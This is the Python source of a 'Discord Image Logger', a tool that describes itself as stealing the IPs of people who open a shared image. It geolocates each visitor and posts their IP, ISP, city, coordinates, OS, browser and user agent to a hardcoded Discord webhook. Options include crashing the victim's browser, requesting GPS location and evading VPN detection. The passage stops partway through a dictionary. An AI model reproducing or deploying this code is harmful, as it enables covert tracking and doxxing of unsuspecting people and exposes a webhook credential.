# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1098401976267587625/pzPn7CZibCGQxRl9cU9Cim_wyozIl3uMTNAesyjILfrHjoIE0t7gxkcaFtStU5LGXP-U",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHCBYWFRgVFhUYGRgaGBwZGhkcGBwYHBoYGRoaGhoaGhocIS4lHB4rIRoaJjgmKy8xNTU1GiQ7QDs0Py40NTQBDAwMEA8QHxISHjQsJSs0NzQ0NDc0NDY0NDY0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ2NDQ0NDQ0NDQ0NDQ0NP/AABEIASwAqAMBIgACEQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAAEAQIDBQYAB//EAEUQAAIBAwMCAwYCBggEBQUAAAECEQADIQQSMQVBIlFhBhMycYGRobFCUsHR4fAHFCMkM2KSslNyc4IVNENEs4OipLTx/8QAGgEAAwEBAQEAAAAAAAAAAAAAAAECAwQFBv/EACkRAAICAQQCAgEDBQAAAAAAAAABAhEhAxIxQQRRE2GBBSIycaGx0eH/2gAMAwEAAhEDEQA/ANbSV1cags6kqO/d2KWgmBMDmhbXUVaBxOB3z6+VAWHUlJurgaALCyfBQDUbpz4KAc5qpcIS5FmkNJNNJqBi0hNITTZpgKaYaWaVEJoAaFmiEtAU5VAqn13XUV/dKQW5ZolUGOwyxzwKEhWlyWt24APMxIExP7hWVu9QuBmuPBBJW2i8ACJP4jnNF6bVEux3SoT44ySSxBAP5fIeVD2NMrYKktty5JABY4iO8Rx555NNphPbt5z0QatgGR1l2yhWCPEQwGSSCJjIPnQmtD7/AHTZ2BUUKuWQCFgxxzx3n6OuoNPel13IykBd0wpxEzyPP51otG5dEuIp2qcEwQJMY7tiAfLmcRWidGCTnhvgfb0gNs7VOF2qIE/WeJPNdRWm1Ba3cKiY3RkQYyQsfFAI57saSs3ydC0r7WA6mk0tIaKAQ1CLCgzAqakpAdXbwvibgZP7qQ1n+t9UhjbU+IRAjk0mOKt5Lk9YubhKSrcNECRggEZqdzmhek6MlFa5IYNO2ZA9IyB5486Ic5NU+EEmrwJNNJpCaQmpEcTXE0lE2rPc0wKpPaFCdi2BuMiWbcJFWSalRbDsQo2yxPAjms91fR2rNwOrQWJOz59wO2ZqJ9Qr2GDN+kgUSYhjDYBk8/hQuTdxTSaDNT1X3oISVUNBnBZeCfTMY70Do7dlt7A7ThdwAY48h9R9hTLmnV7cKGARA0+bEGWnuABj503pSK7qoUKFBMg9oG4k+eODzNNo5nDc36RaafQp7s7nAUA5YSQN5yY8xtH/APaZ76EU2pO0As5/RDZLEcmFI/nmXqwmyHAWXYQSVAlWgmDzMeXlUdvSvaQEDc7kEISTAjLHuVGO/lOKqOVYnFLT3dkOv6a11VG4AiAIUCQCRGDxyQKLu9PdGUKjQjKN/baSqAR37cH9tCaa5cZzdchUUGEJAZio7Rxnz9KvNAHuAFyQRkDG1ihUqR88/j5Uk32Zxg9u4j/qzqgVMgEKFjnbJ8RHCloz8jxXUT1XV3EtgLCl5UNzGDOI5wM8eI+ddVrJtHQlqLdZKa41xpKgLEptONNNSFkd59qlvKs5prYuahWbO2Xn8vxNWHWdREJ6T+6oOgJJd/ko/M/spdmyjUGzS6Y4oRzk0Rpzg0M/JqnwYCTSIpNOS2Woh7iW1LMQAOSeBSoYtu2F5oDqmuYIfdld0hZPwrPf51XdT1ty4QqHagaW/WdQCYx24xQySRBTLPIBEKCARBXsMz9vKnXoSkuyHV3veBWmSSUjkksIVuMAsB3xjjuF0xSXAMkNIAzg89vrRWvQWnS5tkGVIEqAYEEeufw+dQ3CVckYh90eeZim8UVoyk7XotOmqrI6LHkdxJ2jAAHFd0qwHcq0eIkFllAioIYyccbfuZpiqygOiEITvaM75JiRztEfz2VA1xXe2SATKqoncJHvB4ucqCAf40RMt/x7ovIYzMQltFYLbK8w2PhAOY7zA5/Kfo9kuZJYkJsiCAJgsBJ4+EfQ+dO6JootncjKcuSYJODtOPqfmTTek3yWuBwQimCxnJgCCSZJ/fTlKsIHN7Umitu6Vt/cS5CeLxA94AGRgZIHp63dvUBPdWRO9mAYwQRElmjmNsY+VCanTIbqQg2ss8uBIlwTOZMRER61ZLrdthS7+N4uMSpKywwgKnwtETzE1W2y9WcfiSvgh9odKr3VSMbCw8fESC23bmBBifOlqH+rl4ckSysqli07QGzJJAztPrHNdV8YN46qjFJMA6X1h7jbCg9SMR8xV3NJsHMZrjWJzo4000pND626VR2AJIUmBUjMz1PUy7Ge5+wxVp7Pj+y3frMT9OB+VZS88nGZrZ9LtFbNvGCgj59/rNSjo1cQSLTTnFNS1Jk8VLpLeJNVfUOshXCIJ+KWztWPpkmflV1g5boI6j1RLAAOWPCzBPqfIVmtV1dbxCuYG8GFbG0DIjzmodZqLQutcuMhbwnY7LgQBJUnMmh+qdQtOvFseqwPtFF10bRg3mwsbhcHiYFgNgiAAx4+fb71Ya7VMmxEIySTgFiBg5+ZP2oPQDeLLbgxKgSBBkHaDumO4Jx2oy7eKsgXIQFAzEwTnxYxJnkdzTSzZFRVf0ZELNpnVGMy5bnIIMnd68igNaArsoIMHkcfSjdRpglzaqBi6iYBJzMgepyfXPyqn6rKXnQ8qY/AUpF+PGsvs1HSbalEB8TOI25bAMcD4VAyT6xgGrPpXRms7jdugIWJW2OBM/pczHYeXNA+z3UtljaijduaWPrBFde1TucS58ycD6/umreMGLj+6zSagwy7RClDByAO4Efc/Jaz1zSF0Xc64DME/wA0gRP0jjzHnV/rNKzogBhvdqOYHYnkGeKrhstBXcjcQJK5Y8hVUZMYJ7nn1pONilJ7WumVAvPdf3DbgU3Hwt2CnciE+YMDtU2r6QxubkRStxsbmjbjxLtn55+flNDe0VzaUuo20hQPCGUyZbg8YA8+TVxoL0om9/GQCFiZyCfHGT4gcdxGatNqmc0YqTakyzWwWQnbkLtCjMQYAz2xz6d66otJqi1t2A/WKz+lHMKeABtGe811RJ54Oz4t3ax9gs00mmzTWakSKTTCa4vSKJoAxfVdJ7m6YHgaWX08x9P3UX0jq7oYMFDkrn7j1q79obKNZZT8Y8SxyD+48VhiYwSQRiJNQ8M69OSlGmb+9rGdGK4QrAYHJJHB8v4VU253lMFSBAIM7R+kfXAqo6P1drW7bweQcg1qAqPbt6jCORtKrwYlvphT96q8GMtK3SPOfafpznUM3iee5MnBIEnzgCmXenOu0By+5QSAd21u4+nnV/11wro42xcDsIIMQ5mQODniqp3QRtySQIgCT2+VWpPg0WmmrZfdCsP7tLbNtVg7Id0eKdsD5YaB+rWp6Z0ZjbXcyr4pJEtOZPPfgZ8qodBcsu9u013cbRYkKAcoBKbu3Hr8JojU+1XxIgCKJCqPzqJS6MY6MpSbar/Rpdb1O1phgbnI7nOOPkK836vfNy6zx4nPA7ngRXarXs8kmaK9n326hCySzSUJ/RAVjuA78YqI23k6dsdONo1HROiFLYN4hZM7ScCcAR3PFD9U9qrFiUtoXdZBJEKCO2f2Csrpuo3b+ostcdmm6mCcfGvCjAoHqK/2t3H/AKj/AO81tRyt5PW/aC8RYRoYlkTCg5mCRj+cVUaJQto74C+EK5wFgDbAzJkDGexq0623hsKVBG1SZJGNsYj1IqC0GvbVdPCqAxIEsfgJAJggAkjHbzp8INTGkl7ZG+ptO4tGG3RM+pLfxovW6QMwZXWN6EKBDEswHxKMYPrxVDb2Wy4CQwLgud0pOAZyVGe3lV90rTgICciTtMQQfCRn9KNpz6DyqUqyzP4mobpd8Et6w4TwA/EAEg7YWYkzgFu2ec+ddTeqay4iAK0FjtmJIwewB8lg11WrZUfHlNXYBvX9amMTUDpUDA1lY6DkWaF1XVQp2IN0GGbsJE48+33oHX3m2RJg9vMQZ/n0qHTIS6tEciM4ECAfsPtQiW+hpdizczyX5MLLc9+32qp6sga4EVQGJAniZ43ffmr/AEoYsx5OwIyAfDgmAO/xetZ2yyvq0Dnwm6AxMDExQy9Fu2/QJZQqWVlII7GrHTawpZCk+JpgfqpPPzMT9B61qus2LFxCyBV92RLxEq5YH1I8M/Q1nej9GbVXGNp12KwADH9EDCiB5AZ9aql30bLUbVrl4/6WnX/Y24q2haKXi43XLR2p2nejkzjj7VjNbpV0jvNuXRgqS+8BoBLFR8O2Rz3IieR7Lr0uOiPb90oQHxFWYgEbSEJ47ZjtWD9pNVqkuFE0xdCJVwjkHcpQ7grRGThvIGMVMZW8jcajhcGS6PrkVrbAFXZm940ypZj4WGcHzA8zUWu1P9o/nuzRuj9jtS9t7m1UVIDC4WRs4B2lePWrz2M6GH1T/wBYQF7I8dtoMXBCqSO4I8XlNW4xbbTEpy201x/grdDonGy5dRvdkzBwXUenIU+ferHTa/32uR9oUQygDsFR4FFe2eoL6lVRjjamD3nP50P0DpN0XkuOmxPGZc7CZRx4VPibnsKhJWKcm45KboA/vOnn/jW/961pNNe0K27wuWne+1xwoBgSWO3bH7jQfR9Jp0vWfG9x/eJG1diA7hBJbxMAc4Amm6nrrozraVLPiYFkQbzkzNxpb8a0swaZ6ZrElUHEIp/0jgz2mqro9xSzqoBaTjIHwr8zVzduwVBk/wBkCf4k9z++swrlButpDXJZnYEAiQBBbCjn9lRLlImSbju6Q3VaYi4FNvO4MSp3naxIAAnwiZ+9WexybaKAbavtZlIjasttAOczAOfOgdZcQFLm4xtKEAfpFWgjaAG3EAAx5zSv1ZEQWACPd+EgSrG4AdxbG1lmcfyNFGxamtFwUb4CvaKwr3VSF+AtEsCDkFoGCRIx880lDjRkhWwHZW2gqAQsNBkDzKx8q6qwdcdbbFJHOlDOlWdxKFuJWFGBSdQ4jsZmOSI7ff8AA0/3LSgkeLGe49Pmpb7URrrY258yPupH5xXWUDOI4Jw3GVUDH+UifvTiRL6LDUau1ppVELPEFj8u5/dA9a8vuamLoY9nk/Q5r0j2hTxt8v2dqx/VNAl0SjKLgA8Mgb/MZ/SptGmm0nkl6tcVtNCPnemAeQRdJJH1X70N0Pr1zSo9tLYcMwYnfsPHBIyR6VU9PvgOEfiSGHlHn5QRVg6pJXmD4SO/8yKmTdVR6Ph+NozuU5VX2X6+3WqYEC3ZA2gbSXJ2rmBUul9rL7r710R0V1dgAyAbPhRTJz3yPKsi98ggICzkwB+FGjQFI8QhxJGSqt3BaIJ+U80kqXFHRqQ8beowlft9GkX27QrcPubqtcEbwFIEElTtmWgGOazl7r4Tqr6qySUuMARxuRraqwIPBBE/NRQKPt8LjY0cERjsR6U/T9NN+4iIBvZvCTjgE5PlitY0sUZ6nhRnp74TTpWy79n1Op1W48W1e4x9QMf/AHEH6VP0kk6hSxJba8ljJ/w37mtX7N+zS6S1cO7e7odzcCADhR5SaynSx/eR8rn/AMb1m8NI81uwXpRP9Ysf9VP961V65Tvf/nb8zWg6FoHa7acIxVXQltpgAMDM8U+90AlizuiZJjdvPPkk0KVEtG+6ir7VKyYRRAEyTg/LEifUxVfZtsR4j4SkbdowvLFpkQTP0jzmiPaHWG0gKvtJCicdyASJMVUWLz3EBLsChUEAwzKBnaVnMycEfCMntqlaMZwajv64BQiWdTDvCOu5CBKoxI2kDyBkccNVjf6dvdXS4V3kFsSpM7QQZ78RRFnpCX3m6NwVRxCtJiJZQJwD5c114pbfYEgB4VtzNwBht3aA2f8AKKE/TMoQjT3fgMayWRifE0QYGDzGCcL6eVdQ2ivt7hm2gSpZQfiI7sewJwAe+0V1Zy54Oj4t3aB21iTt3AE8AyszxE0jrVJ1S2N6DkFU+Xw0XoHZVVWkqR4ScxHK/KCIoaEpWLrh4YgSQcnAGIk/Uj8KcCqlZBGMD/NER3gTAz+tUmttSs/P/aSPxA/CpYJdRAhTMR4mXaJP0Yr/AKaqJMsO0Qe0aHcwBIJWARzlSPrXnWp0oRSzM0yczHHkPQ4+len+0gQMxdtqAZMSAI8q8w9rHR/HY3NaiCx5LD4mg529p8wfq6tlwdXgr01LXH3HJGBAA7elHW9NvMNKt2P7DQHssjFywEwpIHrgftrY6/puqt2vfXEVUJHhaN2e4XkfWKcp7cHZ43hvUSbdW6X2V3TUKXIe34ipXcYjPJE+n50Vd14Vyijd2iMT2wKr3vO45k9xMGkt610EBNuIB25HqD51zyludnev07Ugv25I+tgbggQhhlifXsf5+9FexO4a6wO25v8A43qJBv8A0ST3Y/nNWPslcVddaGDJZflKNn8K6YyW2jk1vC1dNOSPVbvwP/yt+VYrTu4vYS0igPlVG/8Aw2IO4yeY71s9QfA//K35V5za1bNrSCTAF0ATgRbf8axk8o4oq0wjousd79ve7N415JPBrVaPpanJFZn2XdRcUEpMqR+sCSIj71pG9oNPaTe74B2wFYkt5AR+PFcuq5bf25ZsqTH+0zAm2hmDJJABAEESQfXHnnFV927uVRYIRgAztIOAI2hs8krEciauurWw5B2g+GZ77eYB7TjPpQ3Q7YYvuO7t2BhYgSPKT967FJVRzaslJKKKrpXUdQhe46qEIMydxAXiAD3kZNHXAl1lfYwdnXJ4Pi8RCn5HJ8xVvb6ZZWR7pAIyTmZjBB+Q+1CXEW2zAAKGJwuOcgwODI/Gj+JG2KjXZBqLDqkqrSWnaB4fCDsHxA/hHoK6oOq665bQKjAM24TBYg7c4z5CPma6rVv0XHxpTV2VfUID2ywJlV794HOM0Qm020jncABMkQPEf586A12qVrlu2xVXgbVLiTtAExH4VY6bTR6n8vlUSeKJis2dqCNmSZgkQJJKgn6UTp7O1kgzySe5lefuM/KotShEEGIB4weJwe3w/nT3ALqisQSdpAEDjcRPcbd3+qnHgmWJWZ/+lG2zmzbBjfdUH/SfvHP0rPLoVfUpZP8AhojOydiqDwg/9xWfrW69sdMjOhYSUcMueDBHHyNZfQaUo+o1Lkbfdsg/ywUYZ9fL0qZS6OjSSWRPZSyX15ZhKrHi4A25H2rR+2fV0faiNvCkk7eJ8p715vpfaK8yEgIJJHf4fkDmh361e/WX/T/Gj45M9PS8jxtOak23X12XWou2iZZWU+YwaaOoKMKTH+bJ/GqQ9fuDlVb7j9tNPXJ5tL9G/hU/DL0eov1Xxn3/AGLl9QXwXAX9UY/IZq59lNKg1VogjlonEnaf41krHXVH/oj/AFfwqw0ftGqujlCu1g0ghuD8h2q1py9Eavn+NODipq2muD2nVnwPJjwtn/tNeUdHTTDVKRqLjuFuiPd7R/h3N0szk8T27CvUtS+605HdGP3Sa8P9nbwfWhhwVvH/APHuVSjZ8umaD2c6jpRfsoi3yzOiqXdAJ3rtlVXMc88A0R1nrdpEkadCQ5+J3MHzww8vwrHex5nV6af+LbP194n8am6zrFdHUKZ3tn5R+801FXQnJ2e6PeXAYjNoHyMdzIBj+JrP9P1I0+9y8hyYXbOwSDkzA5GTzHerfqLMiKcQEUHzJOOMbgATiYzVOlhXAC24hPC4AK7jDcd44nHoc1nJZsTlGmqz0Eazql4XAm91G3fConwgSVJZQRMjjiCcjNclpnNrUs5VDcLBGJ8UA7DJMwImIzz3qlfV3Hf3UgPbLeIzsCGQzCYMDcCB2mpdXr7qs1oruVYRcjbtA8BVIENHcHnz4rRKzOWsmkmuAzrypdvKBsPgLAhiIzBaVMORzwMDkRFdTG0LQpP+Iytgj4RDESwG6ZKwOO1dTpHoQ11GCSsy/WdTba+bm0lt1oo2zA2mWMkYjFaEdcQoh3p8eRImAIJjyzVB/wCHlaA1lx0IVWHIDCFMCMfLFYOTZzqMTe3tSCgZWEHPMSIP7JqS0WLruAG4mRGBAUgzzgCPlWSTV+C1IkGeTiCMz9Ca1bOVKkqSCBtwBnAEn/uUfQ1cXgylSll4He29g7BdRtxmIUSYIJ3fLFebnWgpfVtxJUYnBicx5iD962nWlb3T7EMjaG2yW92FJBaOwJz868l6wjW7rpukq0BgTlTkQfIgijbbNoS2xr7HWoCFfJm+fMfsoYCptPhMjJz9CJB+xpjV0IxfJE5qMmnuKHLUxoIQ1LuxQ61PbpoTR750y/v0asMlrP1JKRXk3sr0HUpqFZ9PdVQl2SyMolrNxQJI5JIH1r0P2Wu7umpPa06/RQyj8q8u9l77HVLLMR7u/gsT/wC3umsfY0WXsn7OatNVYd9NdVVuISxQgAB1JJPlANRav2Y1kMRp3y7mNhnJEGeO1V/sdeY63TAsxm8kySf0hR3TtSs3gzcM0SSIWSJGe1NJtinLaro9d6r1FkUEBWwFhuCSQJx2mqwdWlEZbcldqRvAAduSATnJjAInngVJ15VZLaGJZjEg9gSDuGRxxxQd0pZtzvZhc2yqjJkZJLGRkZ+VQuDXUjFaSfbYN1jWNbuJeUidoR1IgknkMsAcYx+yj0tWdQtt2UKeJWQckwARhgPwg0Ne9zf/ALLkmIIiQeeT/MTRl7UGywt7zs3AbG7DG1lPoFPlM/OpUk+DlhSbtXZamxNt5JcgQeCTzG7gSeY7TXVF0q84tMzBQYZlUSWA5YkjieBP6orqUuToelufPBl+vn3dtmUEngcRk981jNJdLuZiQ2fsQJ+X7K1uvvFwVJUg/wCX95rN3OnbHUoRLNBJ4yCZMfzmlQqd2XaoAlg8yAfwA7fOtRprgLqwLETORCkBQp/Pd9PSq7pnTUuC0m9lhIlSMcDuP5itSOiEMrIynbMAiOVA9fKqXApXYKiFU3KwDNCCSJ3IVEyDwVJ/CvJP6RbYGqLAgh0RpHcgFDPr4K9cbpVyWZrfCSNkMCSIKgTMwq9u9eW/0nWWXUCVgFTGInxMfqfFz61UeaJjb/AD1+0EFlQP/bWjPnKTNUBerv2k1Qe6Ss7AiKg/VUIpC/SSKoTW0RrORWNRsKcTTbaywHmQPuYpspD1NPD119NrMvkY+namCaEI9s9lCP8AwxI/4Tz84avLPZg/3tf+nf8Aw01yvTfYu4R0sEgHalzByIAMSPKsJ7N9XtvfE6Kwre7vHchupgWLhI27yuRK8YmRWfbBFb7Dr/fdN/1U/wBwqHUjxN/zN+daD2S1ukbVWNuke25uptK6gsobcI3KyEx6A0Pe/wDD2LeLVodzcraccmY27TFDeQPVuraYFEwZjJk4WZOP0uOKqum6Wdx4hdnO8Zgs0sJzj7HzrS60AwuJKYmJ+cHED9orN9DNze6kMFklXiZwB3+QrCUmsDm5NL0ip03ukc7UlwX2lSWG6PCCAYycD5fOr7TXXuIquAYZZaIKhXQ7g3JBmcfKqfqFoB9pAJYglw7bCrEhRBMLn1+WIm6019LaICfF8LTzJJxHaQFMU26yazjGOkmllhWqsOqFl3MSwJC/CVE7FMMGzjJnnNdUHUtY9ldqMoYtt2tOCQefTjnyHnS1Ssyj47mrAjaRf0F+1KjoT5fJYo+6sjihdgHNc+5mtBKXlBWD+FWVrqAHciqaQYopGqlJicS8ta1j6j5RWK/pQ6U+rSx7tQbi3GXLADY6EnPzQVegnnsfpWU9uNexRbSBySQ+5UZiNpIEMPhPmfL51cZNMShbPNOoFg7K4hlOxhjDJ4SMY5FV5NGa55JPcnJ8z3P1NA10ohIQmnWJ3rGfEuPPIpz2iMmOPOrT2QsB9bp1PAcMfKEBfP2olgYV7X6UpdD7dquoI9SOfrxVEhr0P+lvVAnT2xBw7k8nsoE+XP2rzoNSi8CSweq+xWuQaF7Wd+y6TJGfCTgdh++vP/ZP/wAx/wDQ1H/69yvUvZXoyLoEKoouXLLS5GZuKeTzGRWQ6X7F6uxeLG2HX3N5dyOr+JrNxVG3DZJA+HvSvkSKP2H/APOab/rJ/uFCahDLZ/Sb8zVh7N6C5a1um95bdCLyYdGT9L/MBNA3J3H5n86G8lHvHVjtAbZI2QWABInAEnhZMkjOKzV3TsVXbd+FS5ByRJHiCiAcAHIJ7+dajrVxFtguhZdq8CWBxEVR6dbW1GUplQWZt+6W4WQMnjBnzrFq8ilv2tdMFuOjtbdX8JBVgQpkqpYMxblfCDk47nE0bb06G3bvXn3XQ63PVQwhS4ziRMtwcelVep06td2Egoyk7duzdcMkA43A5+lR6vcrsyMUVySFZCAPD4wHCnHpxFNNMlubjTVpFl7Q3Fv3EUEM2wkCShUruM+Z5HhI/RwRNdUCaUhVYk7+QApgA7v0isqTPHpXVVx9nfDUqCRZm4D50k+hooWxNEIgHauKzOgVbJxU4SpHpEGatMlohuqxGKrdeilCjgQwKmGIkHnIFXNxJqt1OkBOZNG4EsnkntboEsuqoDtInJn8YE1nRW+/pK0u33TgY8S/XBrBEV16buKZnLlh+t6a9u3busU23Z2gMCw2xO9R8PIo/wBiCo1Q3GJRtp4zg4+gNF9ctF7Ft0DsgXJliqQBGDwOc0L7OuqX1YrIbwT3XdA3D+eJqpPcnRCwT+3x/vK5n+zXvPdqzNu2WIUcsQo+ZMCrH2h1O/U3D2DbB8lx++k9nrRfU2FHJup+DA/soWIjPaNOt1ERNwhFCxjsAKk9+45QH5H9lTX7JIPyNV+m07A9+D+VcvyMtRRYJq5jdPyIMfuqLU+zOkvZawknlkGw/dIpLTNIkVMLg8iD5iqWoDgW3VujjUWwm9kIIIYAN8MESpMcgH6VRn2TIRl3o+QyyNuREKWcNAgRhvyrRWNaNoBngZpy6hTwwqlJDe5x2vgxmu0LpCsgO2CBh5APAYZ3GRx5VO3iSHTcg5WZMknmSfSPmOKs+uGHRs5Xt5q08/Jjx5VMltGcySxZIyxMSAe/qG+9ZPmiopKNlS9lQrAMYCnPxxkzJkHn7cV1G3EQM7AQIGJIAMdhnuwrqf5BxRY/1T1pwsUSFrmtg1lRQKbNKiZokKB61x9KQgV1I7UNdTNHvFA6i+q8mhjPMP6U9U4e1anwbC8ebbiufoPxrAbq9G/pHKXnt7CfeKpByIKnIBHYzOawWn0Lu6oQRLBSTwJMTXZpSSgTLQniVOnwex9C6an9UtJd2km0odcEEFeD9IqC17HaNXDqvBkA3HIBHoWz9aj90wgZMAAd8CpLMg1z7n0w2o8u9qNN7vV30kH+0LCOIfxgfQMB9KuP6NFT+vKXE7UZlPZWAAkj5Ej60N7Y6JzqrjASG2n5HYoj8KX2WutprvvWWQVKEA5hipnykbePyrpclt56HHQ1JPCZ7Vd1qQfEKCTWKTAYd/TtVXa1SXF3IwYenY+RHY+lDiCfofyrlYbWnTL63qcgBgfrSMfSqKxaMgg96kGpde/fvRY6NLACgmo59cUNa1cqN0VJbvDsRnzpiIOokhQQfhafocGorGuBCk7WhQsyP0SCM+kRHqaP1FoOhUNG4R5/WqS70tkHiBCjIKguCcTiJWk8FRpk17VZeJBLEiSCI8s4xFdUPuBE5meAQSfWBNdUWVRtgtIVpqNUeoukcUyKJGUVC15R3quuagsaahooB2puE53RWW6p1YTsttOYZon6LkT8/XvWl1+lZ7TqhAcrCyYz8+1ZEey+qeAwVR5s8/bbJpquzr8WGk7lqP8ABl9dcG5jyZkk5yeSKbpNJcuMCiECfiIgcz35+lbjS+yKIwZ23t8oUH0H7SasjoY4xTcjfW8xfxiV9u8T8Ug/KnmzPY0SdMe4qa3pm/VP2qTzqMv1X2Ze4xdHho4IkGPlkGqG906/ZnehA/W5U/PH516alpp+E/aphp2ONlNM6dHypQxyjzDQ3ijB15gA8yR5EgRWp6VfF1d3BEgjyP8AMVb6j2btuZNoAn9Xw/faRRWh6JsG1ECjnmZ++TTbsvyNbT1I2lkD0OlGCfOj306dxVimnCgQK42p5AqTiBbWiQyBIxNI3To4zR5tgCRg1HuaqsRWPaYdopyah1xNWTXY7CoHvg8qDSAibUK3xorfMA/nXUjop/RIrqeB5LaR2MUxgD3qMCaXZ51AEF7TzxUSaUjJowJTp8zTsABpFKbxol1odrdA0RFiaRVp4tN6VIieYFAx2njyosJPFRJHlRCP6RSJITimoafcSaaluKYE6KaSa4v61EXpgShZpu0zSI1P3UANZKgmiwKGfBIoERsJqBrJnn71MzVHu9aBocyeVdTSAe5rqACBcinhvOhTcUVJ7yeDUjokd6YBSgVxNAzqUCmzThmgBwWkZPKnKKkAoAitL51Pio2eKb7zNAmSDmnBR5VGY7mO9IHoEOuIDxUOzzoiaiJzTAjYD50u01zOPKlDU0A0kjuaRMzPNSzNNYRTAiZKRrQqWkIooCILFdXMK6kAOaktiowtPUxSZYWormSkssKc1IQiilWuUVzVIyQNXbqiRs1LVCOKcZqTbUAkmiFWgTIvdUw24oqKaaKCxiDFPRK4MKb3piGPazT95CFIHOP3fOnTTXWRTugIENK1TouKabdAEKmuYiuZKaadgIVrq6a6igBd1KTUJpymkUT23ijKr0ou3xSYEgSnBBTBUhpAcRSMK6uHNFASK0dqU3R5UwHFNegRI10Um5T3H3qA1G1A6DkQEY/OnLZoS3xTxTQBZtiu20L7w+dSe8NUTROUqOKb74+lSUNAQ3AKHaiL9DGmAjiupa6gD//Z", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
